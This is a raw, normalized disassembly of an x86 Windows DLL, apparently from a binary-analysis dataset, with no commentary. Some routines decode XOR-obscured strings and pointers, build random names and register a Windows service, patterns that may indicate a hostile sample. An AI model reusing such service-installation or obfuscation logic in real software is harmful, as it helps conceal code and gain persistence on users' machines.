test eax eax
jne r-xdata
pop edi
lea eax [ esi + 0x5 ]
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
call edi
mov edx [ ebp - 0x40 ]
add esp 0x4
push edx
call [ FreeLibrary@IAT ]
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
xor eax eax
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
call edi
add esp 0x4
pop edi
pop esi
mov eax 0x6
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1005f830
push ebp
mov ebp esp
push 0xffffffff
push sub_10086e61
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
xor edi edi
mov [ ebp - 0x4 ] 0x2
cmp [ esi + 0x8 ] edi
je r-xdata
mov eax [ esi + 0xa0 ]
cmp eax edi
je r-xdata
call [ r--data ]
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
mov eax [ esi + 0x8c ]
mov [ esi + 0x70 ] r--data
cmp eax edi
je r-xdata
push eax
call sub_1000a86e
add esp 0x4
mov eax [ esi + 0x7c ]
cmp eax edi
je r-xdata
push eax
push edi
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi ] r--data
cmp [ esi + 0x40 ] 0x8
jb r-xdata
push eax
call sub_1000a86e
add esp 0x4
xor ecx ecx
mov [ esi + 0x40 ] 0x7
mov [ esi + 0x3c ] edi
mov [ esi + 0x2c ] cx
cmp [ esi + 0x20 ] 0x8
jb r-xdata
mov eax [ esi + 0x2c ]
push eax
call sub_1000a86e
add esp 0x4
xor eax eax
mov [ esi + 0x20 ] 0x7
mov [ esi + 0x1c ] edi
mov [ esi + 0xc ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov edx [ esi + 0xc ]
push edx
call sub_1000a86e
add esp 0x4
sub_1005f933
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push [ ebp + 0xc ]
and [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x8 ]
push eax
push [ ebp + 0x8 ]
lea eax [ ebp - 0x1 ]
push eax
mov [ ebp - 0x1 ] 0x0
call sub_10063545
mov al [ ebp - 0x1 ]
add esp 0x10
leave
retn
sub_1005f95d
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0xc ]
push esi
push edi
mov [ ebp - 0x1c ] eax
call sub_10030bed
and [ ebp - 0x14 ] 0x0
cmp [ rw-data ] 0x0
mov [ ebp - 0x18 ] eax
jne r-xdata
mov eax [ rw-data ]
mov ecx [ ebp - 0x18 ]
mov esi [ DecodePointer@IAT ]
cmp eax ecx
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp [ rw-data ] ecx
je r-xdata
xor eax eax
mov edi [ GetProcAddress@IAT ]
push r--data
push ebx
call edi
test eax eax
je r-xdata
push [ rw-data ]
call esi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
push eax
call esi
push [ rw-data ]
mov edi eax
call esi
mov ebx eax
test edi edi
je r-xdata
mov esi [ EncodePointer@IAT ]
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
push r--data
push ebx
mov [ rw-data ] eax
call edi
push eax
call esi
mov [ rw-data ] eax
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp - 0x1c ]
push [ ebp - 0x20 ]
push [ ebp - 0x14 ]
call eax
jmp r-xdata
call eax
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
test ebx ebx
je r-xdata
push r--data
push ebx
call edi
push eax
call esi
mov [ rw-data ] eax
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
mov eax [ rw-data ]
cmp eax [ ebp - 0x18 ]
je r-xdata
call edi
test eax eax
je r-xdata
push eax
call esi
test eax eax
je r-xdata
or [ ebp + 0x10 ] 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call ebx
test eax eax
je r-xdata
push [ ebp - 0x14 ]
call eax
mov [ ebp - 0x14 ] eax
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_1005fae0
push ebp
mov ebp esp
push ecx
test esi esi
je r-xdata
mov eax 0x1
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push edi
lea edx [ ebp - 0x4 ]
mov eax 0x11b
call sub_10069020
movzx ecx [ esi ]
or edi 0xffffffff
xor eax eax
test cx cx
je r-xdata
lea eax [ ebp - 0x4 ]
push eax
mov edx 0x7ffffffe
mov eax 0x104
mov ecx ebx
call sub_10072780
test eax eax
jns r-xdata
mov edx [ ebp - 0x4 ]
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
push esi
push ecx
mov ecx 0x104
call sub_10012950
test eax eax
jns r-xdata
mov eax 0x4
pop edi
mov esp ebp
pop ebp
retn
movzx ecx [ esi + eax * 2 + 0x2 ]
inc eax
test cx cx
jne r-xdata
mov edi eax
xor eax eax
pop edi
mov esp ebp
pop ebp
retn
mov eax 0x5
pop edi
mov esp ebp
pop ebp
retn
cmp cx dx
jne r-xdata
cmp edi 0xffffffff
je r-xdata
test edi edi
je r-xdata
lea edx [ edi + 0x1 ]
cmp edx 0x7ffffffe
jbe r-xdata
push esi
mov eax 0x104
mov ecx ebx
call sub_10072780
test eax eax
jns r-xdata
xor eax eax
mov [ ebx ] ax
mov eax 0x2
pop edi
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
lea ecx [ esi + edi * 2 + 0x2 ]
push ecx
push edx
mov ecx 0x104
call sub_10012950
test eax eax
jns r-xdata
mov eax 0x2
pop edi
mov esp ebp
pop ebp
retn
mov eax 0x3
pop edi
mov esp ebp
pop ebp
retn
sub_1005fbf0
push ebp
mov ebp esp
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ r--data ]
xor eax eax
jmp r-xdata
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xff87
and edx 0xff
mov [ ebp + eax * 2 - 0x10 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x6 ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xffcd
and edx 0xff
mov [ ebp + eax * 2 - 0x28 ] dx
inc eax
cmp eax 0x5
jb r-xdata
mov ecx [ r--data ]
xor eax eax
mov [ ebp - 0x1e ] ax
lea esp [ esp ]
movsx edx [ ecx + eax ]
xor edx eax
xor edx 0xfff3
and edx 0xff
mov [ ebp + eax * 2 - 0x1c ] dx
inc eax
cmp eax 0x4
jb r-xdata
push ebx
push esi
mov esi [ lstrlenW@IAT ]
push edi
lea ecx [ ebp - 0x1c ]
xor eax eax
push ecx
mov [ ebp - 0x14 ] ax
call esi
lea edx [ ebp - 0x28 ]
push edx
mov edi eax
call esi
add edi eax
lea eax [ ebp - 0x10 ]
push eax
call esi
add eax edi
lea ecx [ eax + eax + 0x6 ]
push ecx
push 0x40
call [ LocalAlloc@IAT ]
mov ebx eax
test ebx ebx
jne r-xdata
lea edx [ ebp - 0x10 ]
push edx
call esi
add eax eax
push eax
lea eax [ ebp - 0x10 ]
push eax
push ebx
call sub_1007f580
add esp 0xc
lea ecx [ ebp - 0x10 ]
push ecx
call esi
push r--data
mov edi eax
call esi
add eax eax
push eax
lea edx [ ebx + edi * 2 ]
push r--data
push edx
call sub_1007f580
add esp 0xc
push r--data
call esi
add edi eax
lea eax [ ebp - 0x28 ]
push eax
call esi
add eax eax
push eax
lea ecx [ ebp - 0x28 ]
push ecx
lea edx [ ebx + edi * 2 ]
push edx
call sub_1007f580
add esp 0xc
lea eax [ ebp - 0x28 ]
push eax
call esi
push r--data
add edi eax
call esi
add eax eax
push eax
lea ecx [ ebx + edi * 2 ]
push r--data
push ecx
call sub_1007f580
add esp 0xc
push r--data
call esi
lea edx [ ebp - 0x1c ]
push edx
add edi eax
call esi
add eax eax
push eax
lea eax [ ebp - 0x1c ]
push eax
lea ecx [ ebx + edi * 2 ]
push ecx
call sub_1007f580
mov ecx [ ebp - 0x4 ]
add esp 0xc
pop edi
pop esi
mov eax ebx
xor ecx ebp
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_1005fd8b
push 0xc
push r--data
call sub_1007fad0
mov edi [ ebp + 0x8 ]
mov eax edi
sar eax 0x5
mov esi edi
and esi 0x1f
shl esi 0x6
add esi [ eax * 4 + rw-data ]
mov [ ebp - 0x1c ] 0x1
xor ebx ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x1c ] ebx
je r-xdata
push 0xa
call sub_1002f3c9
pop ecx
mov [ ebp - 0x4 ] ebx
cmp [ esi + 0x8 ] ebx
jne r-xdata
mov eax [ ebp - 0x1c ]
call sub_1007fb15
retn
mov eax edi
sar eax 0x5
and edi 0x1f
shl edi 0x6
mov eax [ eax * 4 + rw-data ]
lea eax [ eax + edi + 0xc ]
push eax
call [ EnterCriticalSection@IAT ]
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1005fe21
push 0xfa0
lea eax [ esi + 0xc ]
push eax
call [ InitializeCriticalSectionAndSpinCount@IAT ]
test eax eax
jne r-xdata
inc [ esi + 0x8 ]
mov [ ebp - 0x1c ] ebx
sub_1005fe2a
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
mov eax [ rw-data ]
and [ ebp - 0x18 ] 0x0
lea ecx [ ebp - 0x18 ]
xor eax ecx
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x14 ]
inc eax
mov [ ebp - 0x14 ] sub_1007f96a
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
mov eax [ fs : 0x0 ]
mov [ ebp - 0x18 ] eax
lea eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
push [ ebp + 0x18 ]
push ecx
push [ ebp + 0x10 ]
call sub_10082060
mov ecx eax
mov eax [ ebp - 0x18 ]
mov [ fs : 0x0 ] eax
mov eax ecx
leave
retn
sub_1005fe8a
mov edi edi
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
push eax
xor edi edi
push edi
push edi
push edi
push edi
push ecx
lea eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x20 ] ecx
xor ebx ebx
call sub_100266c2
add esp 0x20
mov [ ebp - 0x14 ] eax
test al 0x4
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
call sub_1004067f
test [ ebp - 0x14 ] 0x2
pop ecx
pop ecx
jne r-xdata
mov ebx 0x200
mov [ ebp - 0x1c ] edi
mov [ ebp - 0x18 ] edi
jmp r-xdata
mov ebx 0x80
cmp eax 0x1
jne r-xdata
mov eax [ ebp - 0x24 ]
sub eax [ ebp - 0x20 ]
mov ecx [ ebp - 0x4 ]
sar eax 0x1
mov [ esi + 0x4 ] eax
mov eax [ ebp - 0x1c ]
mov [ esi + 0x10 ] eax
mov eax [ ebp - 0x18 ]
mov [ esi + 0x14 ] eax
pop edi
mov [ esi ] ebx
mov eax esi
pop esi
xor ecx ebp
pop ebx
call sub_10032529
leave
retn
or ebx 0x100
cmp eax 0x2
jne r-xdata
test [ ebp - 0x14 ] 0x1
jne r-xdata
sub_1005ff33
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_100579de
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_100579de
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_1005b670
mov [ eax ] 0xc
push edi
push 0x220
call sub_100579de
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_1001b2d2
mov eax [ esi ]
mov ecx rw-data
call sub_10080d3a
push [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
mov edx [ esi ]
call sub_100811ff
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_1001b2d2
push esi
call sub_1001b2d2
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_1005c4ab
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_10038bf1
push [ esi ]
call sub_1000a2a1
push esi
call sub_1001b2d2
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_1001b2d2
push [ esi ]
call sub_10038bf1
push [ esi ]
call sub_1000a2a1
push esi
call sub_1001b2d2
add esp 0x10
xor esi esi
jmp r-xdata
pop edi
pop esi
pop ebp
retn
mov eax esi
jmp r-xdata
sub_10060030
mov eax [ edi + 0x4 ]
push ebx
mov ebx [ eax + 0x4 ]
cmp [ ebx + 0x15 ] 0x0
push esi
mov esi ebx
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ eax + 0x4 ] eax
mov eax [ edi + 0x4 ]
mov [ eax ] eax
mov eax [ edi + 0x4 ]
pop esi
mov [ eax + 0x8 ] eax
mov [ edi + 0x8 ] 0x0
pop ebx
retn
mov ecx [ esi + 0x8 ]
push ecx
mov ecx edi
call sub_100293b0
mov esi [ esi ]
push ebx
call sub_1000a86e
add esp 0x4
cmp [ esi + 0x15 ] 0x0
mov ebx esi
je r-xdata
sub_10060080
push ebp
mov ebp esp
push esi
push edi
push 0x324
push 0x0
push ebx
call sub_1007f8f0
mov esi [ ebp + 0xc ]
lea edi [ ebx + 0x122 ]
mov ecx 0x40
[ edi ] [ esi ]
mov edi [ ebp + 0x10 ]
mov eax edi
add esp 0xc
lea esi [ eax + 0x1 ]
lea ecx [ ecx ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
mov esi [ ebp + 0x8 ]
push eax
add esi 0x20
push edi
mov ecx esi
call sub_1003e780
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx + 0xc ] eax
mov [ ebx + 0x10 ] eax
mov ax [ ebp + 0x14 ]
mov edi 0x1
mov [ ebx ] 0x7fffffff
mov [ ebx + 0x4 ] 0x7fffffff
mov [ ebx + 0x14 ] edi
mov [ ebx + 0x18 ] edi
mov [ ebx + 0x20 ] ax
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push edi
push esi
lea edx [ ebx + 0x122 ]
call sub_1003ac10
mov ecx [ ebx + 0x14 ]
mov edx [ ebp + 0x8 ]
add esp 0x8
mov eax edi
pop edi
mov [ edx + 0x380 ] ecx
pop esi
pop ebp
retn 0x10
mov esi [ esi ]
sub_10060120
push ebp
mov ebp esp
push 0xffffffff
push sub_10087ceb
mov eax [ fs : 0x0 ]
push eax
push ecx
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov edx [ edi ]
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] ebx
mov esi [ edx + 0x4 ]
add esi edi
call sub_10025690
mov eax [ ebp + 0xc ]
mov ecx esi
mov [ esi + 0x38 ] eax
mov [ esi + 0x3c ] ebx
call sub_10021d80
mov [ esi + 0x40 ] ax
cmp [ esi + 0x38 ] ebx
jne r-xdata
mov ecx [ edi + 0x10 ]
mov edx [ ecx + 0x4 ]
mov [ edi + edx + 0x10 ] r--data
mov eax [ edi ]
mov ecx [ eax + 0x4 ]
mov [ edi + ecx ] r--data
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax [ esi + 0xc ]
or eax 0x4
or eax 0x4
push ebx
mov ecx esi
call sub_10039ae0
sub_100601d0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor ecx ecx
mov eax edi
mov edx 0x2
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_1002b2d3
dec edi
add esp 0x4
xor esi esi
mov ebx eax
test edi edi
jle r-xdata
mov eax [ ebp + 0x8 ]
pop edi
xor edx edx
mov [ ebx + eax * 2 - 0x2 ] dx
pop esi
mov eax ebx
pop ebx
pop ebp
retn 0x4
lea ecx [ ecx ]
call sub_10071d65
xor edx edx
mov ecx 0x1a
div ecx
inc esi
add edx 0x61
mov [ ebx + esi * 2 - 0x2 ] dx
cmp esi edi
jl r-xdata
sub_10060250
push ebp
mov ebp esp
push 0xffffffff
push sub_100863d4
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
xor ebx ebx
push ebx
call sub_1000c927
mov [ ebp - 0x4 ] ebx
mov [ esi + 0x4 ] ebx
mov [ esi + 0x8 ] bl
mov [ esi + 0xc ] ebx
mov [ esi + 0x10 ] bl
mov [ esi + 0x14 ] ebx
mov [ esi + 0x18 ] bl
mov [ esi + 0x1c ] ebx
mov [ esi + 0x20 ] bl
mov [ ebp - 0x4 ] 0x4
mov eax [ ebp + 0x8 ]
cmp eax ebx
jne r-xdata
push eax
push esi
call sub_10029fe1
add esp 0x8
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0x1c ]
mov [ ebp + 0x8 ] r--data
call sub_10032538
push r--data
lea ecx [ ebp - 0x1c ]
push ecx
mov [ ebp - 0x1c ] r--data
call sub_10055e2a
sub_100602f1
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov edx [ ebp + 0x10 ]
xor ebx ebx
cmp edx ebx
jne r-xdata
cmp [ ebp + 0x8 ] ebx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x4 ] bl
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
push esi
mov esi 0x7fffffff
cmp edx esi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop ebx
leave
retn
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x10 ]
cmp ecx ebx
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
jmp r-xdata
push [ eax + 0x8 ]
lea eax [ ebp - 0x10 ]
push edx
push [ ebp + 0xc ]
push edx
push [ ebp + 0x8 ]
push 0x1001
push ecx
push eax
call sub_1001cd1a
add esp 0x20
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push edx
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100635e8
add esp 0x10
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
add eax 0xfffffffe
call sub_1005b670
mov [ eax ] 0x16
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_10060405
mov edi edi
push ebp
mov ebp esp
inc [ rw-data ]
push 0x1000
call sub_1005f1fb
pop ecx
mov ecx [ ebp + 0x8 ]
mov [ ecx + 0x8 ] eax
test eax eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
pop ebp
retn
sub_1006044e
mov edi edi
push ebp
mov ebp esp
mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_10060490
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0x8 ]
mov edx [ ebp + 0xc ]
push ebx
push esi
xor eax eax
mov [ ebp - 0x10 ] ecx
mov ecx [ ebp + 0x10 ]
mov [ ebp - 0xc ] edx
mov edx [ ebp + 0x14 ]
mov bl 0x38
push eax
mov [ ebp - 0x8 ] ecx
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
mov [ ebp - 0x4 ] edx
mov edx [ rw-data ]
mov [ ebp + 0xc ] edx
mov edx [ ebp + 0x8 ]
xor [ ebp + 0xc ] bl
xor [ ebp + 0xd ] bl
xor [ ebp + 0xe ] bl
xor [ ebp + 0xf ] bl
push eax
lea ecx [ ebp - 0x1c ]
push ecx
push edx
push eax
push eax
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] eax
call [ ebp + 0xc ]
mov esi eax
mov eax [ rw-data ]
mov [ ebp + 0x8 ] eax
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push 0xffffffff
push esi
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov [ ebp + 0x8 ] ecx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push esi
call [ ebp + 0x8 ]
mov edx [ rw-data ]
mov eax [ ebp - 0x18 ]
mov [ ebp + 0x8 ] edx
xor [ ebp + 0x8 ] bl
xor [ ebp + 0x9 ] bl
xor [ ebp + 0xa ] bl
xor [ ebp + 0xb ] bl
push eax
call [ ebp + 0x8 ]
mov eax [ ebp - 0x14 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
sub_10060560
push ebp
mov ebp esp
sub esp 0xa8c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ ebp + 0x10 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0xa88 ] eax
mov [ ebp - 0xa8c ] ecx
mov [ ebp - 0xa84 ] edx
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
test ecx ecx
je r-xdata
cmp [ ebp + 0xc ] 0x0
je r-xdata
test ebx ebx
je r-xdata
test edi edi
je r-xdata
test edx edx
je r-xdata
push esi
push 0xf003f
push 0x0
push 0x0
call [ OpenSCManagerW@IAT ]
mov esi eax
test esi esi
jne r-xdata
push 0x0
lea eax [ ebp - 0xa74 ]
push eax
push 0x104
push edi
call [ GetFullPathNameW@IAT ]
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
lea ecx [ ebp - 0xa74 ]
push ecx
push 0x1
push 0x2
push 0x10
push 0xf003f
push ebx
push ebx
push esi
call [ CreateServiceW@IAT ]
test eax eax
jne r-xdata
lea eax [ esi + 0x2 ]
mov edi [ CloseServiceHandle@IAT ]
push eax
call edi
push esi
call edi
lea edx [ ebp - 0x4c ]
mov eax 0x2
call sub_1006e040
lea eax [ ebp - 0x86c ]
lea esi [ ebp - 0x4c ]
mov ecx eax
mov edx 0x104
sub esi ecx
push esi
call [ CloseServiceHandle@IAT ]
pop esi
pop edi
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
xor edx edx
push ebx
mov esi 0x104
lea ebx [ ebp - 0x86c ]
mov [ eax ] dx
call sub_10050c60
lea edx [ ebp - 0xa80 ]
mov eax 0x1
call sub_1006e040
lea edx [ ebp - 0xa7c ]
mov eax 0x4
call sub_1006e040
lea edx [ ebp - 0xa78 ]
xor eax eax
call sub_1006e040
mov esi [ ebp - 0xa88 ]
mov eax edx
push eax
push esi
call [ StrStrW@IAT ]
xor edi edi
lea ecx [ ebp - 0x664 ]
test eax eax
mov edx 0x30c
mov eax ecx
je r-xdata
sub eax 0x2
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
sub esi ecx
lea ebx [ ebp - 0xa7c ]
sub ebx ecx
lea esp [ esp ]
lea ecx [ edx + 0x7ffffefa ]
test ecx ecx
je r-xdata
jmp r-xdata
test edx edx
jne r-xdata
movzx ecx [ esi + eax ]
test cx cx
je r-xdata
test edx edx
jne r-xdata
movzx ecx [ ebx + eax ]
test cx cx
je r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
xor edx edx
mov [ eax ] dx
test edi edi
je r-xdata
sub eax 0x2
mov edi 0x8007007a
mov [ eax ] cx
add eax 0x2
dec edx
jne r-xdata
lea eax [ ebp - 0xa78 ]
push eax
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_10050c60
test eax eax
je r-xdata
pop esi
pop edi
lea eax [ edx + 0x7 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
push esi
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_10050c60
test eax eax
je r-xdata
pop esi
pop edi
lea eax [ edx + 0x4 ]
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea ecx [ edx + 0x7ffffcf2 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov edi [ ebp - 0xa8c ]
lea ecx [ ebp - 0xa78 ]
push ecx
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop esi
pop edi
mov eax 0x8
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xa7c ]
push eax
lea ebx [ ebp - 0x664 ]
call sub_10050c60
test eax eax
je r-xdata
pop esi
pop edi
mov eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push edi
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_10050c60
test eax eax
je r-xdata
lea edx [ ebp - 0xa7c ]
push edx
lea ebx [ ebp - 0x664 ]
call sub_10050c60
test eax eax
je r-xdata
pop esi
pop edi
mov eax 0x6
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0xa78 ]
push eax
push edi
call [ StrStrW@IAT ]
test eax eax
je r-xdata
pop esi
pop edi
mov eax 0xa
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
pop esi
pop edi
mov eax 0x9
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0xa80 ]
push edx
mov esi 0x30c
lea ebx [ ebp - 0x664 ]
call sub_10050c60
test eax eax
je r-xdata
lea ecx [ ebp - 0xa7c ]
push ecx
